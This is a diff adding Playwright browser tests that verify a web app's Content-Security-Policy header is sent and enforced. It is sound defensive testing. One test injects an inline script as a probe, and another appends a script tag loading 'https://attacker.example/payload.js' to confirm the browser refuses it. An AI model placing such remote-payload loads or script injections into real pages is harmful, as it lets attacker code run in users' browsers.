@@ -328,4 +328,92 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     const visible = await page.evaluate(() => document.cookie);
     expect(visible).not.toContain("hive_session");
   });
+
+  // #310. The backend tests prove the header is sent and say what is in it.
+  // Only a browser proves it is *enforced*: a policy with a typo, a directive
+  // this Chromium does not implement, or a header a proxy rewrote all look
+  // identical to a unit test reading the string the server produced.
+  //
+  // This harness declares itself a local-development context (see the compose
+  // file), so what Chromium receives here is the *development* policy. The two
+  // ways it differs — the Vite origins in `connect-src`, and no
+  // `upgrade-insecure-requests` — are named in `services/csp_policy.py`, and
+  // neither touches the assertions below. `upgrade-insecure-requests` is in
+  // fact the reason the harness needs the dev policy at all: on plain HTTP it
+  // would rewrite every request to a port nothing is listening on.
+  test("15 — the Content-Security-Policy arrives on the document", async ({ page }) => {
+    const response = await page.goto("/");
+    const policy = response?.headers()["content-security-policy"];
+
+    expect(policy, "no CSP on the document response").toBeTruthy();
+    // The two that matter most for an injected-markup attack, checked as text
+    // because a browser that ignored the whole header would still let the
+    // assertions below about behaviour pass for unrelated reasons.
+    expect(policy).toContain("script-src 'self'");
+    expect(policy).toContain("object-src 'none'");
+    expect(policy).not.toContain("'unsafe-inline'");
+    expect(policy).not.toContain("'unsafe-eval'");
+  });
+
+  test("15b — Chromium refuses an injected inline script", async ({ page }) => {
+    // The fixture is the attack this header exists to contain: markup that
+    // reaches the DOM and tries to run. It is injected from a trusted context
+    // here, which is *stronger* than injecting it through a real sink — if the
+    // policy stops script we planted ourselves, it stops script an attacker
+    // plants.
+    await page.goto("/");
+
+    const violations: string[] = [];
+    page.on("console", (message) => {
+      if (message.type() === "error" && /Content Security Policy/i.test(message.text())) {
+        violations.push(message.text());
+      }
+    });
+
+    const executed = await page.evaluate(() => {
+      (window as unknown as Record<string, unknown>).__csp_probe__ = false;
+      const script = document.createElement("script");
+      script.textContent = "window.__csp_probe__ = true;";
+      document.body.appendChild(script);
+      return (window as unknown as Record<string, unknown>).__csp_probe__ === true;
+    });
+
+    expect(executed, "an inline <script> ran despite script-src 'self'").toBe(false);
+    expect(violations.length, "no CSP violation was reported").toBeGreaterThan(0);
+  });
+
+  test("15c — Chromium refuses a cross-origin script before it reaches the network", async ({
+    page,
+  }) => {
+    // The exfiltration half. Asserting "it did not load" would be vacuous in
+    // this harness — the container resolves no external DNS, so a
+    // cross-origin fetch fails whether or not a CSP exists. What distinguishes
+    // the two is *when*: a CSP refusal happens before any network attempt and
+    // says so, so the violation report is the evidence and the load result is
+    // not.
+    await page.goto("/");
+
+    const refusals: string[] = [];
+    page.on("console", (message) => {
+      if (/Refused to load the script/i.test(message.text())) {
+        refusals.push(message.text());
+      }
+    });
+
+    await page.evaluate(async () => {
+      await new Promise<void>((resolve) => {
+        const script = document.createElement("script");
+        script.src = "https://attacker.example/payload.js";
+        script.onload = () => resolve();
+        script.onerror = () => resolve();
+        document.body.appendChild(script);
+        setTimeout(resolve, 3000);
+      });
+    });
+
+    expect(
+      refusals.join("\n"),
+      "no CSP refusal for a cross-origin script — the policy is not being enforced",
+    ).toContain("attacker.example");
+  });
 });
